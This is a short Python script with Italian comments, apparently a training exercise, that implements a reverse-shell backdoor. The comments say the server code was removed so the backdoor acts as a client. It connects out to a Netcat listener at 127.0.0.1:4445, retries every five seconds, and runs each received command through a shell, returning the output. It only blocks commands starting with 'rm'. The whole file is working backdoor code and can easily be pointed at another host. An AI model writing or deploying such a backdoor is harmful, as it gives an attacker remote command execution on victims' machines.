import socket as so
import os
import subprocess
import time  #Libreria per la gestione del tempo prima di provare la connessione

SRV_ADDR = "127.0.0.1"
SRV_PORT = 4445  

# Creazione del socket
s = so.socket(so.AF_INET, so.SOCK_STREAM)

#s.bind((SRV_ADDR, SRV_PORT))  Rimuovo queste due istruzioni che permettevano alla backdoor di fare da server
#s.listen(1)

#connection, address = s.accept()   Visto che non e' un server in ascolto questo non serve

percorso_partenza = os.getcwd()

# Realizzo una funzione con un try per tentare la connessione in modo da verificare qualche errore
def connect_to_server():
    try:
        s.connect((SRV_ADDR, SRV_PORT))  #Utilizzo connect in modo tale che diventi un client
        print("Connesso a Netcat")
    except ConnectionRefusedError:
        print("Errore di connessione. Riprovo...")
        return False
    except Exception as e:
        print(f"Errore: {e}")
        return False
    return True


while not connect_to_server():
    time.sleep(5)  # Attende 5 secondi prima di ritentare la connessione

while True:
    try:
        data = s.recv(1024) 
        if not data:
            break 
        comando = data.decode("utf-8").strip() 
        result = ""
        
        if comando.startswith('cd'):
            try:
                os.chdir(comando[3:]) 
                percorso_partenza = os.getcwd()
                result = f"Directory cambiata in {percorso_partenza}"
            except FileNotFoundError:
                result = "Directory non trovata!"
        elif comando.startswith('rm'):
            result = "Ci hai provato!" 
        else:
            res = subprocess.run(comando, cwd=percorso_partenza, shell=True, capture_output=True, text=True)
            result = res.stdout if res.stdout else res.stderr  

        s.sendall((result + "\n").encode("utf-8"))  
    except Exception as e:
        print(f"Errore durante l'esecuzione del comando: {e}")
        break

s.close()
